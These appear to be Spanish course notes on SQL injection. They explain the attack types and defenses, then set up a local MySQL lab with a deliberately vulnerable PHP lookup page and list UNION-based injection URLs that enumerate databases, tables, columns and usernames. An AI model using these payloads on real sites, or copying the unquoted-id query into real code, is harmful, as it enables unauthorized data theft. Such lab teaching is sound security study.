
----
- Tags: #SQL #INJECTION 
----
**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Hay varios tipos de inyecciones SQL, incluyendo:

- **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
- **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
- **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
- **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
- **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Cabe destacar que, además de las técnicas citadas anteriormente, existen muchos otros tipos de inyecciones SQL. Sin embargo, estas son algunas de las más populares y comúnmente utilizadas por los atacantes en páginas web vulnerables.

Asimismo, es necesario hacer una breve distinción de los diferentes tipos de bases de datos existentes:

- **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
- **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
- **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
- **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.

A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:

- **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
----
# En este apartado daremos ejemplos de la utilización de las herramientas mencionadas:

- Empezaremos iniciando nuestro interpretador de **MYSQL**
```SQL
mysql -u root -p
```

- Este comando nos permite usar el interpretador que deseemos
```
use mysql;
```

- Este comando indica las tablas o databases del interpretador
```
show databases;
show tables;
```

- Si encontramos alguna información que nos interese podemos observar las columnas de ello con
```
describe user;
```

>**Por lo general la estructura es Base De Datos, Tablas, Columnas Y Datos**

- Para obtener datos de cada columna 
```
select user,password from user;
```

- Para saber si existe o no una columna con el nombre 
```
select user, password from user where user= 'root';
```

# Vamos a crear nuestra base de datos con tablas y columnas propias 

- Empezaremos creando la base de datos 
```
create database Sk8ware;
```

- Ahora crearemos nuestras tables con varias comlunas
```
create table users(id int(32), username varchar(32), password varchar(32));
```

- Para insertar datos en cierta tabla y columna determinada 
```
insert into users(id, username, password) values(1, 'admin', 'admin123');
```

```
insert into users(id, username, password) values(2, 'tony', 'tony1234');
```

- Para ver los usuarios creados
```
select username from users;
```
 >Si reemplazamos username por * nos permite ver todas las tablas con sus datos 

- Para el script que montaremos necesitaremos crear un usuario y contraseña especial para que se conecte a la base de datos
```
create user 'sk8ware'@'localhost' identified by 'sk8ware123';
```

- Hay que otorgar privilegios para que pueda conectarse y operar
```
grant all privileges on Sk8ware.* to 'sk8ware'@'localhost';
```

## Salimos del interprete y creamos un archivo nvim

```
nvim searchUsers.php
```

```PHP
<?php
  $server = "localhost";
  $username = "sk8ware";
  $password = "sk8ware123";
  $database = "Sk8ware";

  // Conexión a la base de datos 
  $conn = new mysqli($server, $username, $password, $database);

  // Sanitización
  $id =mysqli_real_escape_string($conn, $_GET['id']);

  // echo "[+] Tu valor introducido es: " . $id . "<br>-----------------------<br>";

  $data = mysqli_query($conn, "select username from users where id = $id");

  $response = mysqli_fetch_array($data);

  if(!isset($response['username'])){
    http_response_code(404);
  }

?>
```

# LUEGO DE ESTO CREAREMOS NUESTRO SCRIPT CON PYTHON 
```
#!/usr/bin/python3

import requests
import signal
import sys 
import time
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

def makeSQLI():
	print("\n[+] Hola mundo\n")
	sys.exit(0);

if __name__ == '__main__':

	time.sleep(10)
	
	makeSQLI()
```

**Esta opción nos permite ordenar usuarios y nombres de bases de datos apesar del error que indique en la url**
 
 Usuarios por id
- http://localhost/searchUsers.php?id=3' order by 1-- - 

 Nombre de la base de datos
- http://localhost/searchUsers.php?id=1245' union select database()-- - 

 Para ver todas las bases de datos
 - http://localhost/searchUsers.php?id=1245' union select group_concat(schema_name) from information_schema.schemata-- - 
 
 Para saber que tablas tienen las bases de datos
 - http://localhost/searchUsers.php?id=1245' union select group_concat(table_name) from information_schema.tables where table_schema='Sk8ware'-- - 

 Para saber que columnas tiene la base de datos
 - http://localhost/searchUsers.php?id=1245' union select group_concat(column_name) from information_schema.columns where table_schema='Sk8ware' and table_name='users'-- - 

 Para enlistar todos los usuarios
 -  http://localhost/searchUsers.php?id=1245' union select group_concat(username) from users-- -